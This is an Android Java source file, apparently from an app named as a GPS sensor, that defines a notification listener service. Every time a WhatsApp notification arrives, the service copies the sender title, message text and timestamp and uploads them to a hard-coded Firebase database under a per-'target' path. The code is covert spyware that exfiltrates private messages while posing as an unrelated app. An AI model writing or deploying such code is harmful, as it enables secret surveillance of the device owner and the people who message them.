package com.gpssensor.app;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import com.google.firebase.database.*;
import com.google.firebase.auth.FirebaseAuth;
import java.util.*;

public class NotificationCaptureService extends NotificationListenerService {
    public void onNotificationPosted(StatusBarNotification sbn){
        if(!"com.whatsapp".equals(sbn.getPackageName())) return;
        FirebaseDatabase db=FirebaseDatabase.getInstance("https://meme-project-cab7f-default-rtdb.asia-southeast1.firebasedatabase.app/");
        String target=getSharedPreferences("gps",0).getString("target","target1");
        Bundle e=sbn.getNotification().extras;
        String title=e.getString("android.title","");
        String text=e.getCharSequence("android.text","").toString();
        Map<String,Object> m=new HashMap<>();
        m.put("title",title);m.put("text",text);m.put("time",System.currentTimeMillis());
        db.getReference("devices").child(target).child("notifications").push().setValue(m);
    }
}
